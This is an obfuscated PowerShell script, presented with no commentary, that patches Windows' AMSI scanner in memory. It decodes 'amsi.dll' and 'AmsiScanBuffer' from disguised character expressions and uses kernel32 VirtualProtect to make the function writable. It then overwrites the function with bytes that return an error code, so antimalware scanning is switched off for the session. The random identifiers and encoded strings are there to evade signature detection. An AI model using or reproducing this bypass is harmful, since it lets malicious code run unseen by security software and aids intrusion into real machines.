$qOsq9AKNUwTi8FWfbDt = @"
using System;
using System.Runtime.InteropServices;
public class qOsq9AKNUwTi8FWfbDt {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr MDBVSIAAHy3AuMw6, string O_WCNtk0v3cAL6);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr u7ttf_qe_zcpD83YI, UIntPtr dC8oeVpSP7, uint Yk9RefRtx5u30, out uint fBsl);
}
"@

Add-Type $qOsq9AKNUwTi8FWfbDt

$APkN = [qOsq9AKNUwTi8FWfbDt]::LoadLibrary("$([char](1+96)+[CHar](63+46)+[Char](115+38-38)+[CHaR]([bYtE]0x69)+[CHAR]([BYTE]0x2e)+[cHaR](100*53/53)+[CHaR](76+32)+[cHAR](108+33-33))")
$fRjAjxuw55wO_1u5DuGp = [qOsq9AKNUwTi8FWfbDt]::GetProcAddress($APkN, "$(('ÄmsîScá'+'nBúffèr').NOrmalIzE([Char](61+9)+[chAR](111*21/21)+[ChAR](114)+[CHAR](109*14/14)+[CHAr](68+16-16)) -replace [CHar](92)+[Char](112+16-16)+[cHar](123)+[Char](7+70)+[cHar]([Byte]0x6e)+[chAR]([BYTE]0x7d))")
$p = 0
[qOsq9AKNUwTi8FWfbDt]::VirtualProtect($fRjAjxuw55wO_1u5DuGp, [uint32]5, 0x40, [ref]$p)
$IgIq = "0xB8"
$uVL5h6CuVx5jtuwmT56 = "0x57"
$kthT0J52JMLSyL = "0x00"
$GKUjyZTky = "0x07"
$mtSLq0xJVPdeIgdvrVs = "0x80"
$qqEX5FP2sSMn = "0xC3"
$kjjboORvm2qNTr = [Byte[]] ($IgIq,$uVL5h6CuVx5jtuwmT56,$kthT0J52JMLSyL,$GKUjyZTky,+$mtSLq0xJVPdeIgdvrVs,+$qqEX5FP2sSMn)
[System.Runtime.InteropServices.Marshal]::Copy($kjjboORvm2qNTr, 0, $fRjAjxuw55wO_1u5DuGp, 6)